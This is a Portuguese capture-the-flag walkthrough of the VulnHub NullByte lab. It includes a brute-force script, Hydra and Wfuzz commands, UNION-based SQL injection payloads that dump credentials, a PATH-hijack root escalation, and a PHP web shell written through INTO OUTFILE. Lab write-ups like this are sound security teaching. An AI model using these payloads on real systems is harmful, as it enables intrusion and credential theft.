---
title: "VulnHub - NullByte"
tags: [Linux, Medium, Gobuster, Wfuzz, PHPMyAdmin, SQLInjection, SQLMap, SUID, Linpeas, John, Hydra, Bash Brute Force, BurpSuite, Repeater, Exif, Exiftool]
categories: VulnHub
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/inicial.png)

Link: [NullByte](https://www.vulnhub.com/entry/nullbyte-1,126/)

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.0/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/nmap.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/nmap1.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 3 portas aberta no servidor

> Porta 80 -> Web

> Port 111 -> RPC

> Porta 777 -> SSH

## Enumeração da Porta 80

Entramos pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/web.png)

Rodamos o Gobuster

```bash
gobuster dir -u http://192.168.56.118/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/gobuster.png)

### /uploads

Não tem nada de útil por enquanto...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/up.png)

Rodamos outro gobuster nele, agora com a extensão php também

```bash
gobuster dir -u http://192.168.56.118/uploads/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/gobuster1.png)

### /phpmyadmin/

Entramos pra ver

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php.png)

Tentamos diversas credenciais mas nada de importante saiu disso

### /javascript/

Entramos pra ver

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/java.png)

Rodamos o gobuster

```bash
gobuster dir -u http://192.168.56.118/javascript/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/gobuster2.png)

Entramos no **jquery**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/java1.png)

Gobuster nele também

```bash
gobuster dir -u http://192.168.56.118/javascript/jquery -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/gobuster3.png)

Acessamos o **/jquery/jquery**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/java2.png)

Acessamos o **/version**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/java3.png)

Bom, paramos ai... nada de importante.... Vamos voltar para enumeração

### Exiftool

Bom, já que travamos aqui, não temos nada até agora... vamos tentar ver se aquela imagem na página inicial tem alguma coisa escondida

```bash
exiftool main.gif
```

No campo **Comment** temos algo diferente

**P-): kzMb5nVYJw**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/exif.png)

Humm.. estranho... tentamos verificar se tem algo na web com esse diretório

### /kzMb5nVYJw

Sim, temos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/exif1.png)

Bom, devemos fazer um BruteForce nela pra descobrirmos a key. Vamos fazer de três modos, através do Wfuzz, do Hydra e um script em Bash

Primeira coisa é descobrir como está sendo executada a requisição, e qual a mensagem quando da erro

#### BurpSuite

Para isso vamos jogar ela pro BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp0.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp1.png)

Verificamos que é uma requisição POST e a chave é KEY=senha

E a menssagem de erro é **invalid key**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp2.png)

Agora vamos fazer o BruteForce

#### Bash

brute.sh
```
#!/bin/bash

url=$1
variavel=$2
wordlist=$3

display_uso() {
    echo -e "\nUso:\n$0 [url] [variavel] [wordlist] \n"
}

# Caso o numero de argumentos seja menor que dois, vamos mostrar como usar
if [ $# -le 2 ]
    then
        display_uso
    exit 1
fi

# Caso o cara coloque o -h
if [[ ($# == "--help") || $# == "-h" ]]
    then
        display_uso
    exit 0
fi


echo -e "\nFazendo Brute Force em ${variavel}\n Isso pode demorar pra caralho, dependendo do tamanho da wordlist"

while read word; do
    result=`curl -s -d "${variavel}=${word}" ${url}`
    # Aqui tem que fazer o grep pro erro que pegou no burp
    echo ${result} | grep "invalid key" >/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "Show, achei a chave: ${variavel}\e[0m \e[31m${word}"
        break
    fi
done < ${wordlist}
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/bash.png)

Show, vamos pro próximo

#### Hydra

```bash
hydra 192.168.56.118 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -la -t 64 -w 30
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/hydra.png)

Explicação

```
hydra 192.168.56.118 -> IP da máquina
http-form-post -> Indica que é POST o método
"/kzMb5nVYJw/index.php: -> Indica o caminho da requisição
key=^PASS^: -> Indica a chave, o ^PASS^ é o que será iterado
invalid key" -> Indica a mensagem de erro
-P -> Wordlist
-la -> Login qualquer (ele pede)
-t -> Threads
-w -> Tempo de resposta (não é obrigatório)
```

#### Wfuzz

Podemos também fazer isso com o Wfuzz

```bash
wfuzz --hw 25 -c -u http://192.168.56.118/kzMb5nVYJw/index.php -d 'key=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/wfuzz.png)

Explicação

```
--hw 25 -> Não vai mostrar as respostas que contenham 25 letras, que é a de erro
-c -> Cores
-u -> Site
-d -> Qual vai ser o dado enviado, no caso é a key
-w -> Wordlist
```

Agora então acessamos ele com a senha **elite**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/elite.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/elite1.png)

# Exploração SQL

Agora que encontramos um banco da dados... vamos iniciar a exploração dele. Vou mostrar do modo manual, explicando cada parâmetro e comando e também o modo automatizado através da ferramenta SQLMAP, vamos lá então!

## SQLInjection

Bom, agora vamos ver o que podemos fazer com esse novo form

Mandando com ele em branco temos umas informações bacanas... que vamos guardar pra futuro uso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/elite2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/elite3.png)

Bom, o que me chamou atenção aqui foi a estrutura de dados... parece realmente com um banco de dados, podemos vasculhar pra ver se encontramos algum SQLInjection ai...

Jogamos a requisição pro Burp pra melhor trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp4.png)

Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp5.png)

Ao mandarmos uma aspas dupla temos a mensagem de erro

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp5.png)

Isso indica que possivelmente temos um SQLInjection ai pra explorar

Tentamos a clássica UNION SELECT para descobrirmos a quantidade de colunas que temos do outro lado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp6.png)

Descobrimos que são 3, agora vamos verificar qual delas conseguimos manipular

Verificamos que conseguimos manipular as 3

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/burp7.png)

Outra forma de conseguirmos verificar qual é a database é através da INFORMATION_SCHEMA que é o "rascunho" de todas as databases do mysql

[Referencia](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)

**database = SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA**

O payload ficará

```
GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+SCHEMA_NAME,2,3+FROM+INFORMATION_SCHEMA.SCHEMATA+--+-
```

Ai está!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli.png)

Vamos extrair agora as Tables, para isso vamos usar a query **Group Concat** pois ela possibilita termos mais de um resultado na mesma linha, facilitando assim a extração de informações

O payload ficará

```
GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(SCHEMA_NAME),2,3+FROM+INFORMATION_SCHEMA.SCHEMATA+--+-
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli1.png)

Agora vamos veficar quais as tables dentro dessa database **seth** para isso vamos utilizar da query TABLE_NAME

```
GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(TABLE_NAME),2,3+from+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+%3d+"seth"+--+- 
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli2.png)

Agora vamos extrair as colunas (COLUMN_NAME) das tables

```
GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(COLUMN_NAME),2,3+from+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+%3d+"seth"+--+- 
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli3.png)

De uma maneira mais organizada...

```
GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(TABLE_NAME,"%3a",COLUMN_NAME),2,3+from+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+%3d+"seth"+--+-
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli4.png)

Destrinchando melhor...

```
GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(COLUMN_NAME),2,3+from+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA+%3d+"seth"+and+TABLE_NAME="users"+--+-
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli5.png)

O que essa query vai me trazer? Traduzindo… me traga o nome das colunas (COLUMN_NAME) dentro da information schema de todas as colunas (INFORMATION_SCHEMA.COLUMNS) onde eu quero somente da database **seth** (TABLE_SCHEMA) e o nome da tabela dentro dessa database é **users** (TABLE_NAME). Ficou melhor assim?

Certo, agora vamos extrair aquelas informações da database **seth** com as tables **user** e **pass**

```
GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+GROUP_CONCAT(user,"%3a",pass),2,3+from+seth.users--+-
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli6.png)

**ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE**

Essa string é um base64, decodamos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqli7.png)

Gerou um hash md5, quebramos ele

```bash
john hash --wordlist=/usr/share/seclists/Passwords/darkweb2017-top10000.txt --format=raw-md5
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/md5s.png)

A senha é omega... bom... temos um ssh lá, agora podemos logar com o usuário ramses e a senha omega... mas antes vamos fazer umas outras coisas mais, pra fins de demonstração.

## SQLMap

A primeira é a utilização da ferramenta SQLMap para extração do hash, vai ver que facilita muuuito na hora de extrair informações do banco de dados, mas o problema é que automatiza muito, isso as vezes acaba atrapalhando por que você não entende o que está acontecendo por traz dos panos... Mas vamos lá

```bash
sqlmap -u http://192.168.56.118/kzMb5nVYJw/420search.php?usrtosearch=
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqlmap.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqlmap1.png)

Agora extraimos...

```bash
sqlmap -u http://192.168.56.118/kzMb5nVYJw/420search.php?usrtosearch= --dump
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqlmap2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/sqlmap3.png)

Com essa senha podemos fazer SSH com o usuário ramses

# Ramses -> root

Fazendo ssh temos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/ram.png)

Vamos iniciar a enumeração dele então

## Linpeas

[Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/lin.png)

Baixamos pra nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/lin1.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/lin2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/lin3.png)

Verificamos que temos um binário com suid habilitado, o **procwatch**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/suid.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/suid1.png)

## SUID

Então vamos verificar o que podemos fazer ali, executando ele vemos que é um **ps**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/ps.png)

Então podemos fazer o nosso "ps" e nos dar um shell de root

Exportamos o PATH e fazemos um link simbólico para o /bin/sh

```
export PATH=/var/www/backup:$PATH
ln -s /bin/sh ps
```

Executamos e somos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/ps1.png)

Lemos a flag!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/ps2.png)

# Algo a Mais

Outro ponto de entrada na máquina é através do mysql também

## MYSql no SQLInjection

Conseguimos ler o arquivo de configuração e pegar a credencial do banco de dados do phpmyadmin através do SQLInjection

A ideia aqui é simples, pensamos assim, pô sempre que eu faço uma requisição nesse campo search, ele me retorna dados, então ele com certeza está se ligando a um banco de dados... será que não conseguimos ler esse arquivo e pegar essas credenciais, que possivelmente são as mesmas do **phpmyadmin**?

Vamos lá então

Aqui está o arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/l.png)

Lendo ele temos as credenciais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/L.png)

## MySQL - Já dentro

Encontramos credenciais para acessar o mysql, isso depois de fazer o ssh com o usuário ramses

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/lin4.png)

Acessamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/lin5.png)

Encontramos alguns hashs

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/mysql.png)

Possivelmente a senha **sunnyvale** é a mesma pro **root** do **phpmyadmin**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/mysql1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/mysql2.png)

Bom, depois verificamos que exploramos mais aqui ou não... vamos prosseguir

## www-data reverse

Vamos fazer de duas maneiras, uma através do SQLinjection que temos, e outra através do phpmyadmin

### PHPMyAdmin

Agora com essas credenciais podemos pegar um shell de www-data, uma vez que a aplicação phpmyadmin roda como se **www-data** fosse

Vamos ver a versão do phpmyadmin

**4.2.12**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php1.png)

Eu sei que temos um RCE para a versão 4.8, então pode ser que de certo aqui também, tendo em vista ser uma versão mais desatualizada

[Referência](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php3.png)

Esse não vou conseguir pq não tenho LFI na máquina, mas posso tentar fazer outras coisas aqui... como por exemplo salvar um php malicioso e chamar ele

```php
select '<?php echo "<pre>".shell_exec($_GET["cmd"]);' into outfile '/var/www/html/uploads/shell.php'
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php5.png)

Feito! Agora acessamos ele. Temos RCE!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php6.png)

Agora pegamos nosso reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php7.png)

### SQLInjection

Seguindo a mesma ideia, podemos inserir isso dentro do servidor através do SQLInjection que temos

```
GET /kzMb5nVYJw/420search.php?usrtosearch="UNION+SELECT+'<%3fphp+echo+"<pre>".shell_exec($_GET["cmd"])%3b',2,3+into+outfile+'/var/www/html/uploads/sql.php'--+- HTTP/1.1
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php8.png)

Testando agora...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-nullbyte/php9.png)

Isso já deu bastante... por essa máquina.